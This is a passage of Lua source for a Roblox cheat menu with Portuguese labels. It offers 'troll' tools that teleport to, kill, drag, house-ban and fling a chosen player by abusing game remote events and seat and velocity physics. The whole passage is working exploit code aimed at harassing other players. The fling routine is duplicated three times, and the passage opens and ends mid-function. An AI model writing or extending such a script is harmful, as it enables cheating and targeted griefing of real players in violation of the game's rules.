            seat1.CFrame = CFrame.new(Vector3.new(pos.x, pos.y, pos.z)) * CFrame.new(-2, 2, 0)
            task.wait()
        end
        tet:Destroy()
        couch.Parent = LocalPlayer.Backpack
        task.wait()
        couch:FindFirstChild("Handle ").Name = "Handle"
        task.wait(0.2)
        couch.Parent = LocalPlayer.Character
        task.wait()
        couch.Parent = LocalPlayer.Backpack
        couch.Handle.Name = "Handle "
        task.wait(0.2)
        couch.Parent = LocalPlayer.Character
        tet = Instance.new("BodyVelocity", seat1)
        tet.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        tet.P = 1250
        tet.Velocity = Vector3.new(0, 0, 0)
        tet.Name = "#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W"
    until targetPlayer.Character and targetPlayer.Character.Humanoid and targetPlayer.Character.Humanoid.Sit == true
    task.wait()
    tet:Destroy()
    couch.Parent = LocalPlayer.Backpack
    task.wait()
    couch:FindFirstChild("Handle ").Name = "Handle"
    task.wait(0.3)
    couch.Parent = LocalPlayer.Character
    task.wait(0.3)
    couch.Grip = CFrame.new(Vector3.new(0, 0, 0))
    task.wait(0.3)
    ReplicatedStorage.RE["1Clea1rTool1s"]:FireServer("ClearAllTools")
end

-- Função KillWithCouch
local function KillWithCouch()
    local targetPlayer = Players:FindFirstChild(getgenv().Target)
    if not targetPlayer then
        warn("Erro: Nenhum jogador alvo selecionado")
        return
    end
    if not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
        warn("Erro: Jogador alvo sem personagem ou HumanoidRootPart")
        return
    end

    local args = { [1] = "ClearAllTools" }
    ReplicatedStorage.RE["1Clea1rTool1s"]:FireServer(unpack(args))
    local args = { [1] = "PickingTools", [2] = "Couch" }
    ReplicatedStorage.RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))

    local couch = LocalPlayer.Backpack:WaitForChild("Couch", 2)
    if not couch then
        warn("Erro: Sofá não encontrado no Backpack")
        return
    end

    couch.Name = "Chaos.Couch"
    local seat1 = couch:FindFirstChild("Seat1")
    local seat2 = couch:FindFirstChild("Seat2")
    local handle = couch:FindFirstChild("Handle")
    if seat1 and seat2 and handle then
        seat1.Disabled = true
        seat2.Disabled = true
        handle.Name = "Handle "
    else
        warn("Erro: Componentes do sofá não encontrados")
        return
    end
    couch.Parent = LocalPlayer.Character

    local tet = Instance.new("BodyVelocity", seat1)
    tet.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    tet.P = 1250
    tet.Velocity = Vector3.new(0, 0, 0)
    tet.Name = "#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W"

    repeat
        for m = 1, 35 do
            local pos = { x = 0, y = 0, z = 0 }
            local tRoot = targetPlayer.Character and targetPlayer.Character.HumanoidRootPart
            if not tRoot then break end
            pos.x = tRoot.Position.X + (tRoot.Velocity.X / 2)
            pos.y = tRoot.Position.Y + (tRoot.Velocity.Y / 2)
            pos.z = tRoot.Position.Z + (tRoot.Velocity.Z / 2)
            seat1.CFrame = CFrame.new(Vector3.new(pos.x, pos.y, pos.z)) * CFrame.new(-2, 2, 0)
            task.wait()
        end
        tet:Destroy()
        couch.Parent = LocalPlayer.Backpack
        task.wait()
        couch:FindFirstChild("Handle ").Name = "Handle"
        task.wait(0.2)
        couch.Parent = LocalPlayer.Character
        task.wait()
        couch.Parent = LocalPlayer.Backpack
        couch.Handle.Name = "Handle "
        task.wait(0.2)
        couch.Parent = LocalPlayer.Character
        tet = Instance.new("BodyVelocity", seat1)
        tet.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        tet.P = 1250
        tet.Velocity = Vector3.new(0, 0, 0)
        tet.Name = "#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W"
    until targetPlayer.Character and targetPlayer.Character.Humanoid and targetPlayer.Character.Humanoid.Sit == true
    task.wait()
    couch.Parent = LocalPlayer.Backpack
    seat1.CFrame = CFrame.new(Vector3.new(9999, -450, 9999))
    seat2.CFrame = CFrame.new(Vector3.new(9999, -450, 9999))
    couch.Parent = LocalPlayer.Character
    task.wait(0.1)
    couch.Parent = LocalPlayer.Backpack
    task.wait(2)
    local bv = seat1:FindFirstChild("#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W")
    if bv then bv:Destroy() end
    ReplicatedStorage.RE["1Clea1rTool1s"]:FireServer("ClearAllTools")
end

    local PlayerSection = Troll:AddSection({ Name = "Troll Player" })

    -- Função para obter lista de jogadores
    local function getPlayerList()
        local players = Players:GetPlayers()
        local playerNames = {}
        for _, player in ipairs(players) do
            if player ~= LocalPlayer then
                table.insert(playerNames, player.Name)
            end
        end
        return playerNames
    end

    local killDropdown = Troll:AddDropdown({
        Name = "SELECIONAR JOGADOR",
        Options = getPlayerList(),
        Default = "",
        Callback = function(value)
            selectedPlayerName = value
            getgenv().Target = value
            print("Jogador selecionado: " .. tostring(value))
        end
    })

    Troll:AddButton({
        Name = "ATUALIZAR LISTA",
        Callback = function()
            local tablePlayers = Players:GetPlayers()
            local newPlayers = {}
            if killDropdown and #tablePlayers > 0 then
                for _, player in ipairs(tablePlayers) do
                    if player.Name ~= LocalPlayer.Name then
                        table.insert(newPlayers, player.Name)
                    end
                end
                killDropdown:Set(newPlayers)
                print("Lista de jogadores atualizada: ", table.concat(newPlayers, ", "))
                if selectedPlayerName and not Players:FindFirstChild(selectedPlayerName) then
                    selectedPlayerName = nil
                    getgenv().Target = nil
                    killDropdown:SetValue("")
                    print("Seleção resetada, jogador não está mais no servidor.")
                end
            else
                print("Erro: Dropdown não encontrado ou nenhum jogador disponível.")
            end
        end
    })

    Troll:AddButton({
        Name = "TP JOGADOR",
        Callback = function()
            if not selectedPlayerName or not Players:FindFirstChild(selectedPlayerName) then
                print("Erro: Player não selecionado ou não existe")
                return
            end
            local character = LocalPlayer.Character
            local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
            if not humanoidRootPart then
                warn("Erro: HumanoidRootPart do jogador local não encontrado")
                return
            end

            local targetPlayer = Players:FindFirstChild(selectedPlayerName)
            if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
                humanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
            else
                print("Erro: Player alvo não encontrado ou sem HumanoidRootPart")
            end
        end
    })

    Troll:AddToggle({
        Name = "OLHA JOGADOR",
        Default = false,
        Callback = function(value)
            local Camera = workspace.CurrentCamera

            local function UpdateCamera()
                if value then
                    local targetPlayer = Players:FindFirstChild(selectedPlayerName)
                    if targetPlayer and targetPlayer.Character then
                        local humanoid = targetPlayer.Character:FindFirstChild("Humanoid")
                        if humanoid then
                            Camera.CameraSubject = humanoid
                        end
                    end
                else
                    if LocalPlayer.Character then
                        local humanoid = LocalPlayer.Character:FindFirstChild("Humanoid")
                        if humanoid then
                            Camera.CameraSubject = humanoid
                        end
                    end
                end
            end

            if value then
                if not getgenv().CameraConnection then
                    getgenv().CameraConnection = RunService.Heartbeat:Connect(UpdateCamera)
                end
            else
                if getgenv().CameraConnection then
                    getgenv().CameraConnection:Disconnect()
                    getgenv().CameraConnection = nil
                end
                UpdateCamera()
            end
        end
    })

    local MethodSection = Troll:AddSection({ Name = "MÉTODOS" })

    Troll:AddDropdown({
        Name = "SELECIONAR METADO",
        Options = {"ÔNIBUS", "SOFA", "SOFA V2"},
        Default = "",
        Callback = function(value)
            methodKill = value
            print("Método selecionado: " .. tostring(value))
        end
    })

    Troll:AddButton({
        Name = "ELIMINAR JOGADOR",
        Callback = function()
            if not selectedPlayerName or not Players:FindFirstChild(selectedPlayerName) then
                print("Erro: Player não selecionado ou não existe")
                return
            end
            if methodKill == "SOFA" then
                KillPlayerCouch()
            elseif methodKill == "SOFA V2" then
                KillWithCouch()
            else
                -- Método de ônibus
                local character = LocalPlayer.Character
                local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
                if not humanoidRootPart then
                    warn("Erro: HumanoidRootPart do jogador local não encontrado")
                    return
                end

                local originalPosition = humanoidRootPart.CFrame

                local function GetBus()
                    local vehicles = game.Workspace:FindFirstChild("Vehicles")
                    if vehicles then
                        return vehicles:FindFirstChild(LocalPlayer.Name .. "Car")
                    end
                    return nil
                end

                local bus = GetBus()

                if not bus then
                    humanoidRootPart.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
                    task.wait(0.5)
                    local remoteEvent = ReplicatedStorage:FindFirstChild("RE")
                    if remoteEvent and remoteEvent:FindFirstChild("1Ca1r") then
                        remoteEvent["1Ca1r"]:FireServer("PickingCar", "SchoolBus")
                    end
                    task.wait(1)
                    bus = GetBus()
                end

                if bus then
                    local seat = bus:FindFirstChild("Body") and bus.Body:FindFirstChild("VehicleSeat")
                    if seat and character:FindFirstChildOfClass("Humanoid") and not character.Humanoid.Sit then
                        repeat
                            humanoidRootPart.CFrame = seat.CFrame * CFrame.new(0, 2, 0)
                            task.wait()
                        until character.Humanoid.Sit or not bus.Parent
                        if character.Humanoid.Sit or not bus.Parent then
                            for k, v in pairs(bus.Body:GetChildren()) do
                                if v:IsA("Seat") then
                                    v.CanTouch = false
                                end
                            end
                        end
                    end
                end

                local function TrackPlayer()
                    while true do
                        if selectedPlayerName then
                            local targetPlayer = Players:FindFirstChild(selectedPlayerName)
                            if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
                                local targetHumanoid = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
                                if targetHumanoid and targetHumanoid.Sit then
                                    if character.Humanoid then
                                        bus:SetPrimaryPartCFrame(CFrame.new(Vector3.new(9999, -450, 9999)))
                                        print("Jogador sentou, levando ônibus para o void!")
                                        task.wait(0.2)

                                        local function simulateJump()
                                            local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")
                                            if humanoid then
                                                humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                                            end
                                        end

                                        simulateJump()
                                        print("Simulando pulo!")
                                        task.wait(0.5)
                                        humanoidRootPart.CFrame = originalPosition
                                        print("Player voltou para a posição inicial.")
                                    end
                                    break
                                else
                                    local targetRoot = targetPlayer.Character.HumanoidRootPart
                                    local time = tick() * 35
                                    local lateralOffset = math.sin(time) * 4
                                    local frontBackOffset = math.cos(time) * 20
                                    bus:SetPrimaryPartCFrame(targetRoot.CFrame * CFrame.new(lateralOffset, 0, frontBackOffset))
                                end
                            end
                        end
                        RunService.RenderStepped:Wait()
                    end
                end

                spawn(TrackPlayer)
            end
        end
    })

    Troll:AddButton({
        Name = "PUXAR JOGADOR",
        Callback = function()
            if not selectedPlayerName or not Players:FindFirstChild(selectedPlayerName) then
                print("Erro: Player não selecionado ou não existe")
                return
            end
            if methodKill == "SOFA" then
                BringPlayerLLL()
            elseif methodKill == "SOFA V2" then
                BringWithCouch()
            else
                -- Método de ônibus
                local character = LocalPlayer.Character
                local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
                if not humanoidRootPart then
                    warn("Erro: HumanoidRootPart do jogador local não encontrado")
                    return
                end

                local originalPosition = humanoidRootPart.CFrame

                local function GetBus()
                    local vehicles = game.Workspace:FindFirstChild("Vehicles")
                    if vehicles then
                        return vehicles:FindFirstChild(LocalPlayer.Name .. "Car")
                    end
                    return nil
                end

                local bus = GetBus()

                if not bus then
                    humanoidRootPart.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
                    task.wait(0.5)
                    local remoteEvent = ReplicatedStorage:FindFirstChild("RE")
                    if remoteEvent and remoteEvent:FindFirstChild("1Ca1r") then
                        remoteEvent["1Ca1r"]:FireServer("PickingCar", "SchoolBus")
                    end
                    task.wait(1)
                    bus = GetBus()
                end

                if bus then
                    local seat = bus:FindFirstChild("Body") and bus.Body:FindFirstChild("VehicleSeat")
                    if seat and character:FindFirstChildOfClass("Humanoid") and not character.Humanoid.Sit then
                        repeat
                            humanoidRootPart.CFrame = seat.CFrame * CFrame.new(0, 2, 0)
                            task.wait()
                        until character.Humanoid.Sit or not bus.Parent
                    end
                end

                local function TrackPlayer()
                    while true do
                        if selectedPlayerName then
                            local targetPlayer = Players:FindFirstChild(selectedPlayerName)
                            if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
                                local targetHumanoid = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
                                if targetHumanoid and targetHumanoid.Sit then
                                    if character.Humanoid then
                                        bus:SetPrimaryPartCFrame(originalPosition)
                                        task.wait(0.7)
                                        local args = { [1] = "DeleteAllVehicles" }
                                        ReplicatedStorage.RE:FindFirstChild("1Ca1r"):FireServer(unpack(args))
                                    end
                                    break
                                else
                                    local targetRoot = targetPlayer.Character.HumanoidRootPart
                                    local time = tick() * 35
                                    local lateralOffset = math.sin(time) * 4
                                    local frontBackOffset = math.cos(time) * 20
                                    bus:SetPrimaryPartCFrame(targetRoot.CFrame * CFrame.new(lateralOffset, 0, frontBackOffset))
                                end
                            end
                        end
                        RunService.RenderStepped:Wait()
                    end
                end

                spawn(TrackPlayer)
            end
        end
    })


local function houseBanKill()
    if not selectedPlayerName then
        print("Nenhum jogador selecionado!")
        return
    end

    local Player = game.Players.LocalPlayer
    local Backpack = Player.Backpack
    local Character = Player.Character
    local Humanoid = Character:FindFirstChildOfClass("Humanoid")
    local RootPart = Character:FindFirstChild("HumanoidRootPart")
    local Houses = game.Workspace:FindFirstChild("001_Lots")
    local OldPos = RootPart.CFrame
    local Angles = 0
    local Vehicles = Workspace.Vehicles
    local Pos

    function Check()
        if Player and Character and Humanoid and RootPart and Vehicles then
            return true
        else
            return false
        end
    end

    local selectedPlayer = game.Players:FindFirstChild(selectedPlayerName)
    if selectedPlayer and selectedPlayer.Character then
        if Check() then
            local House = Houses:FindFirstChild(Player.Name .. "House")
            if not House then
                local EHouse
                local availableHouses = {}
                
                -- Coletar todas as casas disponÃ­veis ("For Sale")
                for _, Lot in pairs(Houses:GetChildren()) do
                    if Lot.Name == "For Sale" then
                        for _, num in pairs(Lot:GetDescendants()) do
                            if num:IsA("NumberValue") and num.Name == "Number" and num.Value < 25 and num.Value > 10 then
                                table.insert(availableHouses, {Lot = Lot, Number = num.Value})
                                break
                            end
                        end
                    end
                end

                -- Escolher uma casa aleatÃ³ria da lista
                if #availableHouses > 0 then
                    local randomHouse = availableHouses[math.random(1, #availableHouses)]
                    EHouse = randomHouse.Lot
                    local houseNumber = randomHouse.Number

                    -- Teleportar para o BuyDetector e clicar
                    local BuyDetector = EHouse:FindFirstChild("BuyHouse")
                    Pos = BuyDetector.Position
                    if BuyDetector and BuyDetector:IsA("BasePart") then
                        RootPart.CFrame = BuyDetector.CFrame + Vector3.new(0, -6, 0)
                        task.wait(0.5)
                        local ClickDetector = BuyDetector:FindFirstChild("ClickDetector")
                        if ClickDetector then
                            fireclickdetector(ClickDetector)
                        end
                    end

                    -- Disparar o novo remote event para construir a casa
                    task.wait(0.5)
                    local args = {
                        houseNumber, -- NÃºmero da casa aleatÃ³ria
                        "056_House" -- Tipo da casa
                    }
                    game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Lot:BuildProperty"):FireServer(unpack(args))
                else
                    print("Nenhuma casa disponÃ­vel para compra!")
                    return
                end
            end

            task.wait(0.5)
            local PreHouse = Houses:FindFirstChild(Player.Name .. "House")
            if PreHouse then
                task.wait(0.5)
                local Number
                for i, x in pairs(PreHouse:GetDescendants()) do
                    if x.Name == "Number" and x:IsA("NumberValue") then
                        Number = x
                    end
                end
                task.wait(0.5)
                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gettin1gHous1e"):FireServer("PickingCustomHouse", "049_House", Number.Value)
            end

            task.wait(0.5)
            local PCar = Vehicles:FindFirstChild(Player.Name .. "Car")
            if not PCar then
                if Check() then
                    RootPart.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
                    task.wait(0.5)
                    game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("PickingCar", "SchoolBus")
                    task.wait(0.5)
                    local PCar = Vehicles:FindFirstChild(Player.Name .. "Car")
                    task.wait(0.5)
                    local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")
                    if Seat then
                        repeat
                            task.wait()
                            RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)
                        until Humanoid.Sit
                    end
                end
            end

            task.wait(0.5)
            local PCar = Vehicles:FindFirstChild(Player.Name .. "Car")
            if PCar then
                if not Humanoid.Sit then
                    local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")
                    if Seat then
                        repeat
                            task.wait()
                            RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)
                        until Humanoid.Sit
                    end
                end

                local Target = selectedPlayer
                local TargetC = Target.Character
                local TargetH = TargetC:FindFirstChildOfClass("Humanoid")
                local TargetRP = TargetC:FindFirstChild("HumanoidRootPart")
                if TargetC and TargetH and TargetRP then
                    if not TargetH.Sit then
                        while not TargetH.Sit do
                            task.wait()
                            local Fling = function(alvo, pos, angulo)
                                PCar:SetPrimaryPartCFrame(CFrame.new(alvo.Position) * pos * angulo)
                            end
                            Angles = Angles + 100
                            Fling(TargetRP, CFrame.new(0, 1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10, CFrame.Angles(math.rad(Angles), 0, 0))
                            Fling(TargetRP, CFrame.new(0, -1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10, CFrame.Angles(math.rad(Angles), 0, 0))
                            Fling(TargetRP, CFrame.new(2.25, 1.5, -2.25) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10, CFrame.Angles(math.rad(Angles), 0, 0))
                            Fling(TargetRP, CFrame.new(-2.25, -1.5, 2.25) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10, CFrame.Angles(math.rad(Angles), 0, 0))
                            Fling(TargetRP, CFrame.new(0, 1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10, CFrame.Angles(math.rad(Angles), 0, 0))
                            Fling(TargetRP, CFrame.new(0, -1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10, CFrame.Angles(math.rad(Angles), 0, 0))
                        end
                        task.wait(0.2)
                        local House = Houses:FindFirstChild(Player.Name .. "House")
                        PCar:SetPrimaryPartCFrame(CFrame.new(House.HouseSpawnPosition.Position))
                        task.wait(0.2)
                        local pedro = Region3.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position - Vector3.new(30, 30, 30), game.Players.LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(30, 30, 30))
                        local a = workspace:FindPartsInRegion3(pedro, game.Players.LocalPlayer.Character.HumanoidRootPart, math.huge)
                        for i, v in pairs(a) do
                            if v.Name == "HumanoidRootPart" then
                                local b = game:GetService("Players"):FindFirstChild(v.Parent.Name)
                                local args = {
                                    [1] = "BanPlayerFromHouse",
                                    [2] = b,
                                    [3] = v.Parent
                                }
                                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))
                                local args = {
                                    [1] = "DeleteAllVehicles"
                                }
                                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer(unpack(args))
                            end
                        end
                    end
                end
            end
        end
    end
end

Troll:AddButton({
    Name = "MATA JOGADOR BAN",
    Callback = houseBanKill
})

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local flingAtivo = false
local posicaoOriginal = nil

local function iniciarLoopScript()
    coroutine.wrap(function()
        while flingAtivo do
            pcall(function()
                local selectedName = getgenv().Target
                if not selectedName then return end

                local Player = LocalPlayer
                local TargetPlayer = Players:FindFirstChild(selectedName)
                if not TargetPlayer or TargetPlayer == Player then return end

                local Character = Player.Character
                local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
                local RootPart = Humanoid and Character:FindFirstChild("HumanoidRootPart")

                local TChar = TargetPlayer.Character
                local THumanoid = TChar and TChar:FindFirstChildOfClass("Humanoid")
                local TRoot = THumanoid and TChar:FindFirstChild("HumanoidRootPart")
                local THead = TChar and TChar:FindFirstChild("Head")
                local Accessory = TChar and TChar:FindFirstChildOfClass("Accessory")
                local Handle = Accessory and Accessory:FindFirstChild("Handle")

                if Character and Humanoid and RootPart and TChar then
                    local function FPos(BasePart, Pos, Ang)
                        if not flingAtivo then return end
                        RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
                        Character:SetPrimaryPartCFrame(RootPart.CFrame)
                        RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
                        RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
                    end

                    local function SFBasePart(BasePart)
                        local t0 = tick()
                        local Angle = 0
                        repeat
                            if not flingAtivo then break end
                            if BasePart.Velocity.Magnitude < 50 then
                                Angle += 900
                                local vel = BasePart.Velocity.Magnitude / 1.25
                                local dir = THumanoid.MoveDirection
                                FPos(BasePart, CFrame.new(0, 1.5, 0) + dir * vel, CFrame.Angles(math.rad(Angle), 0, 0)); task.wait()
                                FPos(BasePart, CFrame.new(0, -1.5, 0) + dir * vel, CFrame.Angles(math.rad(Angle), 0, 0)); task.wait()
                            else
                                FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0)); task.wait()
                                FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0)); task.wait()
                            end
                        until BasePart.Velocity.Magnitude > 900 or tick() > t0 + 2
                    end

                    workspace.FallenPartsDestroyHeight = 0/0
                    local BV = Instance.new("BodyVelocity", RootPart)
                    BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
                    BV.MaxForce = Vector3.new(math.huge, math.huge, math.huge)

                    Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)

                    if TRoot and THead then
                        SFBasePart((TRoot.Position - THead.Position).Magnitude > 5 and THead or TRoot)
                    elseif TRoot then SFBasePart(TRoot)
                    elseif THead then SFBasePart(THead)
                    elseif Handle then SFBasePart(Handle) end

                    BV:Destroy()
                    Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
                end
            end)
            task.wait(1)
        end
    end)()
end

-- Toggle final e seguro
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local flingAtivo = false
local posicaoOriginal = nil

local function iniciarLoopScript()
    coroutine.wrap(function()
        while flingAtivo do
            pcall(function()
                local selectedName = getgenv().Target
                if not selectedName then return end

                local Player = LocalPlayer
                local TargetPlayer = Players:FindFirstChild(selectedName)
                if not TargetPlayer or TargetPlayer == Player then return end

                local Character = Player.Character
                local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
                local RootPart = Humanoid and Character:FindFirstChild("HumanoidRootPart")

                local TChar = TargetPlayer.Character
                local THumanoid = TChar and TChar:FindFirstChildOfClass("Humanoid")
                local TRoot = THumanoid and TChar:FindFirstChild("HumanoidRootPart")
                local THead = TChar and TChar:FindFirstChild("Head")
                local Accessory = TChar and TChar:FindFirstChildOfClass("Accessory")
                local Handle = Accessory and Accessory:FindFirstChild("Handle")

                if Character and Humanoid and RootPart and TChar then
                    local function FPos(BasePart, Pos, Ang)
                        if not flingAtivo then return end
                        RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
                        Character:SetPrimaryPartCFrame(RootPart.CFrame)
                        RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
                        RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
                    end

                    local function SFBasePart(BasePart)
                        local t0 = tick()
                        local Angle = 0
                        repeat
                            if not flingAtivo then break end
                            if BasePart.Velocity.Magnitude < 50 then
                                Angle += 900
                                local vel = BasePart.Velocity.Magnitude / 1.25
                                local dir = THumanoid.MoveDirection
                                FPos(BasePart, CFrame.new(0, 1.5, 0) + dir * vel, CFrame.Angles(math.rad(Angle), 0, 0)); task.wait()
                                FPos(BasePart, CFrame.new(0, -1.5, 0) + dir * vel, CFrame.Angles(math.rad(Angle), 0, 0)); task.wait()
                            else
                                FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0)); task.wait()
                                FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0)); task.wait()
                            end
                        until BasePart.Velocity.Magnitude > 900 or tick() > t0 + 2
                    end

                    workspace.FallenPartsDestroyHeight = 0/0
                    local BV = Instance.new("BodyVelocity", RootPart)
                    BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
                    BV.MaxForce = Vector3.new(math.huge, math.huge, math.huge)

                    Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)

                    if TRoot and THead then
                        SFBasePart((TRoot.Position - THead.Position).Magnitude > 5 and THead or TRoot)
                    elseif TRoot then SFBasePart(TRoot)
                    elseif THead then SFBasePart(THead)
                    elseif Handle then SFBasePart(Handle) end

                    BV:Destroy()
                    Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
                end
            end)
            task.wait(1)
        end
    end)()
end

-- Toggle final com desequipar ao desligar
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local flingAtivo = false
local posicaoOriginal = nil

local function iniciarLoopScript()
    coroutine.wrap(function()
        while flingAtivo do
            pcall(function()
                local selectedName = getgenv().Target
                if not selectedName then return end

                local Player = LocalPlayer
                local TargetPlayer = Players:FindFirstChild(selectedName)
                if not TargetPlayer or TargetPlayer == Player then return end

                local Character = Player.Character
                local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
                local RootPart = Humanoid and Character:FindFirstChild("HumanoidRootPart")

                local TChar = TargetPlayer.Character
                local THumanoid = TChar and TChar:FindFirstChildOfClass("Humanoid")
                local TRoot = THumanoid and TChar:FindFirstChild("HumanoidRootPart")
                local THead = TChar and TChar:FindFirstChild("Head")
                local Accessory = TChar and TChar:FindFirstChildOfClass("Accessory")
                local Handle = Accessory and Accessory:FindFirstChild("Handle")

                if Character and Humanoid and RootPart and TChar then
                    local function FPos(BasePart, Pos, Ang)
                        if not flingAtivo then return end
                        RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
                        Character:SetPrimaryPartCFrame(RootPart.CFrame)
                        RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
                        RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
                    end

                    local function SFBasePart(BasePart)
                        local t0 = tick()
                        local Angle = 0
                        repeat
                            if not flingAtivo then break end
                            if BasePart.Velocity.Magnitude < 50 then
                                Angle += 900
                                local vel = BasePart.Velocity.Magnitude / 1.25
                                local dir = THumanoid.MoveDirection
                                FPos(BasePart, CFrame.new(0, 1.5, 0) + dir * vel, CFrame.Angles(math.rad(Angle), 0, 0)); task.wait()
                                FPos(BasePart, CFrame.new(0, -1.5, 0) + dir * vel, CFrame.Angles(math.rad(Angle), 0, 0)); task.wait()
                            else
                                FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0)); task.wait()
                                FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0)); task.wait()
                            end
                        until BasePart.Velocity.Magnitude > 900 or tick() > t0 + 2
                    end

                    workspace.FallenPartsDestroyHeight = 0/0
                    local BV = Instance.new("BodyVelocity", RootPart)
                    BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
                    BV.MaxForce = Vector3.new(math.huge, math.huge, math.huge)

                    Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)

                    if TRoot and THead then
                        SFBasePart((TRoot.Position - THead.Position).Magnitude > 5 and THead or TRoot)
                    elseif TRoot then SFBasePart(TRoot)
                    elseif THead then SFBasePart(THead)
                    elseif Handle then SFBasePart(Handle) end

                    BV:Destroy()
                    Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
                end
            end)
            task.wait(1)
        end
    end)()
end

-- Toggle final sem deletar sofá
Troll:AddToggle({
	Name = "FLING FATAL=",
	Default = false,
	Callback = function(ativo)
		flingAtivo = ativo

		local char = LocalPlayer.Character
		local hrp = char and char:FindFirstChild("HumanoidRootPart")
		local selected = getgenv().Target

		if ativo and selected then
			-- Salvar posição original
			if hrp then
				posicaoOriginal = hrp.CFrame
			end

			-- Se não tiver o sofá nem equipado nem no backpack, tenta pegar
			local temCouch = LocalPlayer.Backpack:FindFirstChild("Couch") or (char and char:FindFirstChild("Couch"))
			if not temCouch then
				local args = { [1] = "PickingTools", [2] = "Couch" }
				local RE = game:GetService("ReplicatedStorage"):FindFirstChild("RE")
				if RE and RE:FindFirstChild("1Too1l") then
					pcall(function()
						RE["1Too1l"]:InvokeServer(unpack(args))
					end)
				end
			end

			-- Esperar sofá aparecer no backpack e equipar se ainda não estiver
			task.spawn(function()
				local maxTries, tries = 30, 0
				repeat
					task.wait(0.1)
					tries += 1
				until LocalPlayer.Backpack:FindFirstChild("Couch") or tries >= maxTries

				local tool = LocalPlayer.Backpack:FindFirstChild("Couch")
				if tool and not (char:FindFirstChild("Couch")) then
					tool.Parent = char
				end
			end)

			iniciarLoopScript()

		else
			-- Desequipar sofá se estiver na mão (vai pra mochila)
			local tool = char and char:FindFirstChild("Couch")
			if tool then
				tool.Parent = LocalPlayer.Backpack
			end

			-- Resetar corpo e posição com segurança
			if hrp and posicaoOriginal then
				hrp.Velocity = Vector3.zero
				hrp.RotVelocity = Vector3.zero

				for _, v in pairs(hrp:GetChildren()) do
					if v:IsA("BodyVelocity") then
						v:Destroy()
					end
				end

				task.wait(0.1)
				hrp.CFrame = posicaoOriginal
				print("FLING parado e posição restaurada com segurança.")
